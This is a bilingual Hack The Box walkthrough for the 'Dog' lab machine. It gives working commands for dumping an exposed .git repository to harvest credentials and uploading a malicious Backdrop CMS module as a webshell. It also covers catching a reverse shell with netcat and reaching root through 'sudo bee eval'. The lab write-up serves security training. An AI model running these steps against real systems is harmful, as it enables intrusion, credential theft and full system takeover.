# Dog [Easy]

> **ES:** Máquina Linux fácil: un Backdrop CMS con `.git` expuesto filtra credenciales, un módulo malicioso da shell y `bee` con `sudo` permite ser root.
> **EN:** Easy Linux machine: a Backdrop CMS with exposed `.git` leaks credentials, a malicious module gives shell, and `bee` with `sudo` allows root.

| Campo | Valor |
|-------|-------|
| **Dificultad** | Easy |
| **OS** | Linux |
| **Estado** | Retired |
| **Maker** | [verificar en app.hackthebox.com/machines/Dog] |
| **URL** | https://app.hackthebox.com/machines/Dog |
| **IP lab** | 10.10.11.58 |
| **Fecha de resolución** | 2025-03-04 |

---

## 🎯 Objetivo / Goal

> **ES:** Conseguir `user.txt` y `root.txt` vía `.git` expuesto → RCE autenticado con módulo (tar) → reuse a `johncusack` → `bee eval` con `sudo`.
> **EN:** Get `user.txt` and `root.txt` via exposed `.git` → authenticated RCE with module (tar) → reuse to `johncusack` → `bee eval` with `sudo`.

---

## 🛠️ Herramientas usadas / Tools used

- [ ] nmap
- [ ] dvcs-ripper / rip-git.pl (dump de `.git`)
- [ ] git
- [ ] msf / script de módulo malicioso (tar)
- [ ] ssh / su

---

## 📋 Pasos / Steps

### Paso 1 — Reconocimiento / Recon

> **ES:** SSH y Apache con Backdrop CMS. nmap ya avisa de `/.git/` expuesto.
> **EN:** SSH and Apache with Backdrop CMS. nmap already flags exposed `/.git/`.

```bash
nmap -sC -sV -oN nmap_init 10.10.11.58
curl -s http://10.10.11.58/robots.txt
```

**Resultado / Result:** 22/tcp OpenSSH 8.2p1, 80/tcp Apache 2.4.41, Backdrop CMS. Repositorio git accesible en `/.git/`.

---

### Paso 2 — Enumeración / Enumeration

> **ES:** Se vuelca el `.git` (dvcs-ripper) y en el historial aparecen un correo de usuario y la cadena de conexión MySQL con contraseña reutilizable.
> **EN:** Dump `.git` (dvcs-ripper); history reveals a user email and the MySQL connection string with a reusable password.

```bash
perl ~/tools/dvcs-ripper-master/rip-git.pl -v -u http://10.10.11.58/.git/
cd KELTxFzt && git log --oneline
grep -r "tiffany@dog.htb" files/ 2>/dev/null | head
grep -rn "mysql://" settings.php
```

**Resultado / Result:** Usuario `tiffany@dog.htb` + contraseña de la DB (`settings.php`) que también sirve en el login web (`/?q=user/login`). Capturas en `img/`.

---

### Paso 3 — Acceso inicial (foothold) / Initial access

> **ES:** Logueado en Backdrop, se instala manualmente un módulo malicioso empaquetado en **tar** (no zip) con webshell (idea del EDB 52021) y se visita su URL.
> **EN:** Logged into Backdrop, manually install a malicious module packed as **tar** (not zip) with a webshell (EDB 52021 idea) and visit its URL.

```bash
# generar modulo malicioso (script PoC) -> shell.tar
tar czf shell.tar shell
# subir en http://10.10.11.58/admin/modules/install (Manual Installation)
curl -s http://10.10.11.58/modules/shell/shell.php
nc -lvnp 9999
```

**Resultado / Result:** Ejecución como `www-data` → reverse shell (vía `php -r` con `fsockopen` al listener).

---

### Paso 4 — Usuario (user.txt) / User

> **ES:** Hay dos usuarios locales; la contraseña de la DB se reutiliza con `su johncusack` y su home tiene `user.txt`.
> **EN:** Two local users exist; the DB password is reused with `su johncusack`, whose home holds `user.txt`.

```bash
ls -lh /home/
su johncusack
cat /home/johncusack/user.txt
```

**Resultado / Result:** Sesión como `johncusack` (password reuse) → `user.txt` (flag no reproducida).

---

### Paso 5 — Root (root.txt) / Privilege escalation

> **ES:** `johncusack` corre `/usr/local/bin/bee` (enlace a `bee.php`) con `sudo`. Su subcomando `eval` ejecuta PHP arbitrario como root.
> **EN:** `johncusack` runs `/usr/local/bin/bee` (symlink to `bee.php`) with `sudo`. Its `eval` subcommand runs arbitrary PHP as root.

```bash
sudo -l
file /usr/local/bin/bee
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('whoami');"
sudo /usr/local/bin/bee --root=/var/www/html eval "echo shell_exec('cat /root/root.txt');"
```

**Resultado / Result:** Ejecución como `root` vía `bee eval`. Técnica: abuso de CLI del CMS con `sudo` (eval → RCE).

---

## 🧠 Lo aprendido / Learned

> **ES:** Un `.git` público equivale a código fuente + secretos; tras RCE, probar cada secreto en `su`/SSH; los `sudo` a CLIs con `eval` son root directo.
> **EN:** A public `.git` equals source + secrets; after RCE, try every secret on `su`/SSH; `sudo` on CLIs with `eval` is direct root.

- [ ] Exfiltración de `.git` expuesto (dvcs-ripper)
- [ ] Secretos en `settings.php` y password reuse
- [ ] RCE autenticado en Backdrop CMS vía módulo tar
- [ ] Privesc con `bee eval` bajo `sudo`

---

## 📚 Fuentes y Referencias / Sources

- **Fuente:** Nota local `Soluciones/Machines/unclasified/Dog/index.md` (notas CN/EN sin normalizar, con capturas en `img/`) — autor original de la nota local
- **Walkthrough de referencia:** Máquina Dog en HackTheBox — https://app.hackthebox.com/machines/Dog
- **Referencia técnica:** Backdrop CMS 1.27.1 Authenticated RCE — https://www.exploit-db.com/exploits/52021
- **Fecha de acceso:** 2026-09-24
- **Autor de este walkthrough:** Apuromafo (contenido propio salvo cita)
- **Nota de migración:** Contenido migrado y normalizado desde `index.md` al molde `_PLANIFICACION/PLANTILLA_MACHINE.md`; paráfrasis propia, sin flags completas.

---

## ⚠️ Aviso Legal / Disclaimer

> **ES:** Uso educativo y personal únicamente. No afiliado a HackTheBox. No publicar flags de máquinas activas.
> **EN:** Educational and personal use only. Not affiliated with HackTheBox. Do not publish flags of active machines.

_Fecha de edición: 2026-09-24_
